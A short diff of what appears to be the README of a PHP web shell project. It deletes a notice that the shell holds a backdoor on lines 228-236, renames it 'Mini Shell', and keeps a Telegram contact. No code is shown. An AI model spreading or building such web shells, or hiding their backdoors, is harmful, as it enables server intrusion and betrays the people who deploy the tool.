@@ -1,7 +1,4 @@
-# Custstomized PhP Shell
-simple php Sheller With "Backdoor" On Line 228-236
-		  	
-You can Remove "BackdooR"  On Line 228 Until 236 
+# Custstomized PhP Mini Shell
 
 Telegram id : @RedshoT_Kl
 
